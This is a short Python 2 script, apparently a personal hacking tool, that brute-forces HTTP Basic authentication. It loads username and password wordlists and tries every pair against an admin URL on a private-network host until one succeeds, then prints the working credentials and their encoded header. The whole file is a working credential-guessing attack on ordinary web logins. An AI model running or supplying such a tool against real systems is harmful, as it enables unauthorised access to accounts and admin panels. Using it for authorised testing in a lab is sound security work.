#!/usr/bin/env python

import urllib2
import base64
import sys

#### http://stackoverflow.com/questions/635113/python-urllib2-basic-http-authentication-and-tr-im

print """
HTTP Authorization Brute Force v.0.1
Ken Eddy - files.eddy@gmail.com
"""

request = urllib2.Request("http://192.168.56.101/subroot/catalog/admin")

#open userlist

userlist_file = open("userlist.txt",'r')
userlist = userlist_file.read().split('\n')
userlist_file.close()

#open wordlist

wordlist_file = open("wordlist.txt",'r')
wordlist = wordlist_file.read().split('\n')
wordlist_file.close()

num_ul = len(userlist)
num_pl = len(wordlist)
print "\n[i] Username list loaded %s" % num_ul
print "[i] Password list loaded %s \n\n" % num_pl

for ul in userlist:
	for pw in wordlist:
		base64string = base64.encodestring('%s:%s' % (ul,pw)).replace('\n','')
		request.add_header("Authorization", "Basic %s" % base64string)
		try:
			result = urllib2.urlopen(request)
			if result:
				print "\n\n[+] GOOD JOB %s:%s" % (ul,pw)
				print "[i] Authorization: "+base64string+"\n\n"
				sys.exit(0)
		except urllib2.HTTPError, e:
			print "[-] Trying %s:%s" % (ul,pw)
